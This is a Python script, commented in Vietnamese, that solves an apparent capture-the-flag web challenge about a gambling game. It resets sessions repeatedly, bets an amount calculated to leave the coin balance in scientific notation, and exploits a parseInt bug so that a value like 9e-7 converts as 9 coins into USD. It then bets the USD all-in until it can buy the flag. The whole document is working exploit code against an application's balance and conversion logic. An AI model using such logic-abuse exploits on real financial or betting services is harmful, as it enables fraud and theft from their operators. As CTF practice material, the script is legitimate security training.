import requests
import time

# URL của challenge (thay đổi port nếu cần)
TARGET_URL = "https://chall.polygl0ts.ch:8148/" 

def solve():
    attempts = 0
    while True:
        attempts += 1
        print(f"[*] Attempt {attempts}...")
        
        # 1. Tạo session mới
        s = requests.Session()
        
        try:
            # Lấy số dư ban đầu
            res = s.get(f"{TARGET_URL}/api/balance")
            if res.status_code != 200: continue
            data = res.json()
            coins = data['coins'] # 0.00001
            
            # 2. Glitch Coins: Cược để đưa số dư về dạng Scientific Notation (ví dụ 9e-7)
            # Chúng ta có 10e-6. Cần đưa về 9e-7 (0.0000009).
            # Cần giảm đi: 0.00001 - 0.0000009 = 0.0000091
            amount_to_lose = coins - 0.0000009
            
            # Cược số tiền này. Hy vọng là THUA (91% tỉ lệ) để mất đúng số tiền đó.
            res = s.post(f"{TARGET_URL}/api/gamble", json={
                "currency": "coins",
                "amount": amount_to_lose
            })
            
            data = res.json()
            if data.get('win') == True:
                # Nếu thắng thì số tiền tăng lên, khó tính toán, bỏ qua làm lại cho nhanh
                continue
                
            # Kiểm tra xem đã về dạng glitch chưa (microcoins < 1)
            new_coins = data['new_balance']
            if new_coins >= 0.000001:
                continue

            # 3. Convert: Lợi dụng bug parseInt("9e-7") -> 9
            # Lấy số đầu tiên của scientific notation để convert
            # Ví dụ 9e-7 -> convert 9
            digit = int(str(new_coins)[0]) 
            
            res = s.post(f"{TARGET_URL}/api/convert", json={
                "amount": digit
            })
            
            if "Converted" not in res.text:
                continue
                
            print(f"   [+] Glitch success! Converted phantom coins to USD.")
            
            # 4. Gamble USD: All-in để lên $10
            # Hiện tại có khoảng $0.09. Cần thắng 3 lần liên tiếp (hoặc 2 lần rồi cược nốt).
            # Chiến thuật: Cược tất tay (All-in)
            
            while True:
                # Lấy số dư USD hiện tại
                res = s.get(f"{TARGET_URL}/api/balance")
                usd = res.json()['usd']
                
                if usd >= 10:
                    print("   [$$$] Rich enough! Buying flag...")
                    res = s.post(f"{TARGET_URL}/api/flag")
                    print("\n>>> FLAG:", res.json().get('flag'))
                    return
                
                if usd <= 0:
                    print("   [-] Lost all USD. Retrying...")
                    break
                
                # Cược tất cả USD
                res = s.post(f"{TARGET_URL}/api/gamble", json={
                    "currency": "usd",
                    "amount": usd
                })
                gamble_data = res.json()
                
                if gamble_data.get('win'):
                    print(f"   [!] WON! New Balance: ${gamble_data['new_balance']}")
                else:
                    # Thua hết tiền, break để reset session
                    break

        except Exception as e:
            print(f"Error: {e}")
            time.sleep(1)

if __name__ == "__main__":
    solve()